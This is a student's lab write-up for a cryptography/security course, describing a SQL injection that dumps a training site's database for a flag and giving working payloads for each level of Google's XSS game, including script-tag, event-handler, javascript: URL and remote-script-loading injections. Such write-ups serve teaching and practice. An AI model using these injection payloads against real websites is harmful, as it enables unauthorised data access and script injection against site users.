Writeup 10 - Crypto II
=====

Name: Justin
Section: 0102

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Justin Van Dort

## Assignment 10 Writeup

### Part 1 (70 Pts)

After opening the website, I realized that the only place where user input is accepted is `http://cornerstoneairlines.co:8080/item?id=INPUT`. I also ran `dirb http://cornerstoneairlines.co:8080/` to see if there were any pages which couldn't be found through navigation, but I couldn't find any additional pages. So, after seeing the conveniently bolded **SQL** in the project description, I knew the site would be vulnerable to SQL injection.  

I first tried some of the recommended input from the slides: `' OR '1'='1'`, but recieved an `INTERNAL SERVER ERROR`. This led me to believe that the internal SQL query was in the form `SELECT * FROM table WHERE id = ' + input + ';` (since a single quote produced an error). After some trial and error, I changed the input to `' or '1'='1`, figuring that the server was checking the input for a capitalized `OR` in the user input. 

The server responded with every row in the database, which included the "priceless" item of `CMSC38R-{y0U-are_the_5ql_n1nja}`. 


### Part 2 (30 Pts)

1) Level 1 was very simple. The page did not sanitize the input at all, so any script tags entered into the text field are inserted directly into the HTML. 

```
<script>alert('XSS')</script>
```

2) Level 2 is more difficult than level 1 since it removes any input in between `script` tags. This can be solved by using HTML element attributes. The following HTML is an `input` element, and on focus, the javascript code is ran. The HTML is set up so that the `input` element is auto-focused, so the alert is shown when the page is loaded. 

```
<input type="text" onfocus="alert('XSS')" autofocus="" />
```

3) 

The following code is ran, with the user input from after the `#` in the URL stored in the variable `num`.

```
// Dynamically load the appropriate image.
var html = "Image " + parseInt(num) + "<br>";
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
$('#tabContent').html(html);
```

The following code closes the image element, and adds a script tage after, so the alert script is placed in the HTML.

```
'/><script>alert('XSS')</script>
```

The final URL is:

```
https://xss-game.appspot.com/level3/frame#'/><script>alert('XSS')</script>
```

4) The user input is placed in `timer` in the following code:

```
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

The following user input will start a timer with one second, but also run the alert code. 

```
1');alert('XSS
```

5) Any code in the format `javacript:"code"`, when used as a URL, will run the code portion of the string. The following URL will run the alert when the next button is pressed. 

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('XSS')
```

6) Since the website does not check if the gadget URL is local or remote, I replaced the server-local URL with a remote URL which contained my own javascript code. The code in the remote file was: `alert('XSS')`. When the following URL is loaded, the website loads the malicous JS and runs it. 

```
https://xss-game.appspot.com/level6/frame#Https://jtvd78.github.io/alert.js
```
